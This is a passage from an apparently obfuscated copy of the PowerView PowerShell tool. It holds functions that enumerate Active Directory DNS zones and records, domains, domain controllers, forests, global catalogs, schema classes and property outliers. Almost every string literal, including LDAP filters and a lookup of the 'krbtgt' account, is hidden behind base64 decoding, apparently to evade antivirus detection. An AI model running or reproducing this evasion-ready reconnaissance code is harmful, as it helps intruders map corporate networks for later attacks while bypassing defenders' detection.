            $Data = $([System.Convert]::ToBase64String($DNSRecord[24..$DNSRecord.length]))
            $DNSRecordObject | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGMAbwByAGQAVAB5AHAAZQA='))) $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBSAFYA')))
        }
        else {
            $Data = $([System.Convert]::ToBase64String($DNSRecord[24..$DNSRecord.length]))
            $DNSRecordObject | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGMAbwByAGQAVAB5AHAAZQA='))) $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBOAEsATgBPAFcATgA=')))
        }
        $DNSRecordObject | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBwAGQAYQB0AGUAZABBAHQAUwBlAHIAaQBhAGwA'))) $UpdatedAtSerial
        $DNSRecordObject | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABUAEwA'))) $TTL
        $DNSRecordObject | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBnAGUA'))) $Age
        $DNSRecordObject | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABpAG0AZQBTAHQAYQBtAHAA'))) $TimeStamp
        $DNSRecordObject | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAHQAYQA='))) $Data
        $DNSRecordObject
    }
}
function Get-DomainDNSZone {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.DNSZone')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Alias('ReturnOne')]
        [Switch]
        $FindOne,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        $SearcherArguments = @{
            'LDAPFilter' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABDAGwAYQBzAHMAPQBkAG4AcwBaAG8AbgBlACkA')))
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))] = $Properties }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        $DNSSearcher1 = Get-DomainSearcher @SearcherArguments
        if ($DNSSearcher1) {
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAG4AZABPAG4AZQA=')))]) { $Results = $DNSSearcher1.FindOne()  }
            else { $Results = $DNSSearcher1.FindAll() }
            $Results | Where-Object {$_} | ForEach-Object {
                $Out = Convert-LDAPProperty -Properties $_.Properties
                $Out | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WgBvAG4AZQBOAGEAbQBlAA=='))) $Out.name
                $Out.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBEAE4AUwBaAG8AbgBlAA=='))))
                $Out
            }
            if ($Results) {
                try { $Results.dispose() }
                catch {
                    Write-Verbose "[Get-DomainDFSShare] Error disposing of the Results object: $_"
                }
            }
            $DNSSearcher1.dispose()
        }
        $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQBQAHIAZQBmAGkAeAA=')))] = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBOAD0ATQBpAGMAcgBvAHMAbwBmAHQARABOAFMALABEAEMAPQBEAG8AbQBhAGkAbgBEAG4AcwBaAG8AbgBlAHMA')))
        $DNSSearcher2 = Get-DomainSearcher @SearcherArguments
        if ($DNSSearcher2) {
            try {
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAG4AZABPAG4AZQA=')))]) { $Results = $DNSSearcher2.FindOne() }
                else { $Results = $DNSSearcher2.FindAll() }
                $Results | Where-Object {$_} | ForEach-Object {
                    $Out = Convert-LDAPProperty -Properties $_.Properties
                    $Out | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WgBvAG4AZQBOAGEAbQBlAA=='))) $Out.name
                    $Out.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBEAE4AUwBaAG8AbgBlAA=='))))
                    $Out
                }
                if ($Results) {
                    try { $Results.dispose() }
                    catch {
                        Write-Verbose "[Get-DomainDNSZone] Error disposing of the Results object: $_"
                    }
                }
            }
            catch {
                Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEQATgBTAFoAbwBuAGUAXQAgAEUAcgByAG8AcgAgAGEAYwBjAGUAcwBzAGkAbgBnACAAJwBDAE4APQBNAGkAYwByAG8AcwBvAGYAdABEAE4AUwAsAEQAQwA9AEQAbwBtAGEAaQBuAEQAbgBzAFoAbwBuAGUAcwAnAA==')))
            }
            $DNSSearcher2.dispose()
        }
    }
}
function Get-DomainDNSRecord {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.DNSRecord')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0,  Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $ZoneName,
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties = 'name,distinguishedname,dnsrecord,whencreated,whenchanged',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Alias('ReturnOne')]
        [Switch]
        $FindOne,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        $SearcherArguments = @{
            'LDAPFilter' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABDAGwAYQBzAHMAPQBkAG4AcwBOAG8AZABlACkA')))
            'SearchBasePrefix' = "DC=$($ZoneName),CN=MicrosoftDNS,DC=DomainDnsZones"
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))] = $Properties }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        $DNSSearcher = Get-DomainSearcher @SearcherArguments
        if ($DNSSearcher) {
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAG4AZABPAG4AZQA=')))]) { $Results = $DNSSearcher.FindOne() }
            else { $Results = $DNSSearcher.FindAll() }
            $Results | Where-Object {$_} | ForEach-Object {
                try {
                    $Out = Convert-LDAPProperty -Properties $_.Properties | Select-Object name,distinguishedname,dnsrecord,whencreated,whenchanged
                    $Out | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WgBvAG4AZQBOAGEAbQBlAA=='))) $ZoneName
                    if ($Out.dnsrecord -is [System.DirectoryServices.ResultPropertyValueCollection]) {
                        $Record = Convert-DNSRecord -DNSRecord $Out.dnsrecord[0]
                    }
                    else {
                        $Record = Convert-DNSRecord -DNSRecord $Out.dnsrecord
                    }
                    if ($Record) {
                        $Record.PSObject.Properties | ForEach-Object {
                            $Out | Add-Member NoteProperty $_.Name $_.Value
                        }
                    }
                    $Out.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBEAE4AUwBSAGUAYwBvAHIAZAA='))))
                    $Out
                }
                catch {
                    Write-Warning "[Get-DomainDNSRecord] Error: $_"
                    $Out
                }
            }
            if ($Results) {
                try { $Results.dispose() }
                catch {
                    Write-Verbose "[Get-DomainDNSRecord] Error disposing of the Results object: $_"
                }
            }
            $DNSSearcher.dispose()
        }
    }
}
function Get-Domain {
    [OutputType([System.DirectoryServices.ActiveDirectory.Domain])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
            Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAF0AIABVAHMAaQBuAGcAIABhAGwAdABlAHIAbgBhAHQAZQAgAGMAcgBlAGQAZQBuAHQAaQBhAGwAcwAgAGYAbwByACAARwBlAHQALQBEAG8AbQBhAGkAbgA=')))
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) {
                $TargetDomain = $Domain
            }
            else {
                $TargetDomain = $Credential.GetNetworkCredential().Domain
                Write-Verbose "[Get-Domain] Extracted domain '$TargetDomain' from -Credential"
            }
            $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A'))), $TargetDomain, $Credential.UserName, $Credential.GetNetworkCredential().Password)
            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
            }
            catch {
                Write-Verbose "[Get-Domain] The specified domain '$TargetDomain' does not exist, could not be contacted, there isn't an existing trust, or the specified credentials are invalid: $_"
            }
        }
        elseif ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) {
            $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A'))), $Domain)
            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
            }
            catch {
                Write-Verbose "[Get-Domain] The specified domain '$Domain' does not exist, could not be contacted, or there isn't an existing trust : $_"
            }
        }
        else {
            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            }
            catch {
                Write-Verbose "[Get-Domain] Error retrieving the current domain: $_"
            }
        }
    }
}
function Get-DomainController {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.Computer')]
    [OutputType('System.DirectoryServices.ActiveDirectory.DomainController')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [Switch]
        $LDAP,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        $Arguments = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { $Arguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { $Arguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUAA=')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) {
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { $Arguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
            $Arguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAB1AHMAZQByAEEAYwBjAG8AdQBuAHQAQwBvAG4AdAByAG8AbAA6ADEALgAyAC4AOAA0ADAALgAxADEAMwA1ADUANgAuADEALgA0AC4AOAAwADMAOgA9ADgAMQA5ADIAKQA=')))
            Get-DomainComputer @Arguments
        }
        else {
            $FoundDomain = Get-Domain @Arguments
            if ($FoundDomain) {
                $FoundDomain.DomainControllers
            }
        }
    }
}
function Get-Forest {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Forest,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
            Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEYAbwByAGUAcwB0AF0AIABVAHMAaQBuAGcAIABhAGwAdABlAHIAbgBhAHQAZQAgAGMAcgBlAGQAZQBuAHQAaQBhAGwAcwAgAGYAbwByACAARwBlAHQALQBGAG8AcgBlAHMAdAA=')))
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBvAHIAZQBzAHQA')))]) {
                $TargetForest = $Forest
            }
            else {
                $TargetForest = $Credential.GetNetworkCredential().Domain
                Write-Verbose "[Get-Forest] Extracted domain '$Forest' from -Credential"
            }
            $ForestContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBvAHIAZQBzAHQA'))), $TargetForest, $Credential.UserName, $Credential.GetNetworkCredential().Password)
            try {
                $ForestObject = [System.DirectoryServices.ActiveDirectory.Forest]::GetForest($ForestContext)
            }
            catch {
                Write-Verbose "[Get-Forest] The specified forest '$TargetForest' does not exist, could not be contacted, there isn't an existing trust, or the specified credentials are invalid: $_"
                $Null
            }
        }
        elseif ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBvAHIAZQBzAHQA')))]) {
            $ForestContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBvAHIAZQBzAHQA'))), $Forest)
            try {
                $ForestObject = [System.DirectoryServices.ActiveDirectory.Forest]::GetForest($ForestContext)
            }
            catch {
                Write-Verbose "[Get-Forest] The specified forest '$Forest' does not exist, could not be contacted, or there isn't an existing trust: $_"
                return $Null
            }
        }
        else {
            $ForestObject = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
        }
        if ($ForestObject) {
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
                $ForestSid = (Get-DomainUser -Identity $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('awByAGIAdABnAHQA'))) -Domain $ForestObject.RootDomain.Name -Credential $Credential).objectsid
            }
            else {
                $ForestSid = (Get-DomainUser -Identity $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('awByAGIAdABnAHQA'))) -Domain $ForestObject.RootDomain.Name).objectsid
            }
            $Parts = $ForestSid -Split '-'
            $ForestSid = $Parts[0..$($Parts.length-2)] -join '-'
            $ForestObject | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBvAG8AdABEAG8AbQBhAGkAbgBTAGkAZAA='))) $ForestSid
            $ForestObject
        }
    }
}
function Get-ForestDomain {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.DirectoryServices.ActiveDirectory.Domain')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Forest,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        $Arguments = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBvAHIAZQBzAHQA')))]) { $Arguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBvAHIAZQBzAHQA')))] = $Forest }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { $Arguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        $ForestObject = Get-Forest @Arguments
        if ($ForestObject) {
            $ForestObject.Domains
        }
    }
}
function Get-ForestGlobalCatalog {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.DirectoryServices.ActiveDirectory.GlobalCatalog')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Forest,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        $Arguments = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBvAHIAZQBzAHQA')))]) { $Arguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBvAHIAZQBzAHQA')))] = $Forest }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { $Arguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        $ForestObject = Get-Forest @Arguments
        if ($ForestObject) {
            $ForestObject.FindAllGlobalCatalogs()
        }
    }
}
function Get-ForestSchemaClass {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([System.DirectoryServices.ActiveDirectory.ActiveDirectorySchemaClass])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [Alias('Class')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ClassName,
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $Forest,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        $Arguments = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBvAHIAZQBzAHQA')))]) { $Arguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBvAHIAZQBzAHQA')))] = $Forest }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { $Arguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        $ForestObject = Get-Forest @Arguments
        if ($ForestObject) {
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBsAGEAcwBzAE4AYQBtAGUA')))]) {
                ForEach ($TargetClass in $ClassName) {
                    $ForestObject.Schema.FindClass($TargetClass)
                }
            }
            else {
                $ForestObject.Schema.FindAllClasses()
            }
        }
    }
}
function Find-DomainObjectPropertyOutlier {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.PropertyOutlier')]
    [CmdletBinding(DefaultParameterSetName = 'ClassName')]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ParameterSetName = 'ClassName')]
        [Alias('Class')]
        [ValidateSet('User', 'Group', 'Computer')]
        [String]
        $ClassName,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ReferencePropertySet,
        [Parameter(ValueFromPipeline = $True, Mandatory = $True, ParameterSetName = 'ReferenceObject')]
        [PSCustomObject]
        $ReferenceObject,
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $UserReferencePropertySet = @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBkAG0AaQBuAGMAbwB1AG4AdAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBjAGMAbwB1AG4AdABlAHgAcABpAHIAZQBzAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YgBhAGQAcABhAHMAcwB3AG8AcgBkAHQAaQBtAGUA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YgBhAGQAcAB3AGQAYwBvAHUAbgB0AA=='))),'cn',$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwBvAGQAZQBwAGEAZwBlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwBvAHUAbgB0AHIAeQBjAG8AZABlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABlAHMAYwByAGkAcAB0AGkAbwBuAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAcABsAGEAeQBuAGEAbQBlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABzAGMAbwByAGUAcAByAG8AcABhAGcAYQB0AGkAbwBuAGQAYQB0AGEA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZwBpAHYAZQBuAG4AYQBtAGUA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aQBuAHMAdABhAG4AYwBlAHQAeQBwAGUA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aQBzAGMAcgBpAHQAaQBjAGEAbABzAHkAcwB0AGUAbQBvAGIAagBlAGMAdAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABhAHMAdABsAG8AZwBvAGYAZgA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABhAHMAdABsAG8AZwBvAG4A'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABhAHMAdABsAG8AZwBvAG4AdABpAG0AZQBzAHQAYQBtAHAA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABvAGMAawBvAHUAdAB0AGkAbQBlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABvAGcAbwBuAGMAbwB1AG4AdAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBlAG0AYgBlAHIAbwBmAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAGQAcwAtAHMAdQBwAHAAbwByAHQAZQBkAGUAbgBjAHIAeQBwAHQAaQBvAG4AdAB5AHAAZQBzAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBhAG0AZQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBiAGoAZQBjAHQAYwBhAHQAZQBnAG8AcgB5AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBiAGoAZQBjAHQAYwBsAGEAcwBzAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBiAGoAZQBjAHQAZwB1AGkAZAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBiAGoAZQBjAHQAcwBpAGQA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cAByAGkAbQBhAHIAeQBnAHIAbwB1AHAAaQBkAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cAB3AGQAbABhAHMAdABzAGUAdAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBhAG0AYQBjAGMAbwB1AG4AdABuAGEAbQBlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBhAG0AYQBjAGMAbwB1AG4AdAB0AHkAcABlAA=='))),'sn',$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dQBzAGUAcgBhAGMAYwBvAHUAbgB0AGMAbwBuAHQAcgBvAGwA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dQBzAGUAcgBwAHIAaQBuAGMAaQBwAGEAbABuAGEAbQBlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dQBzAG4AYwBoAGEAbgBnAGUAZAA=')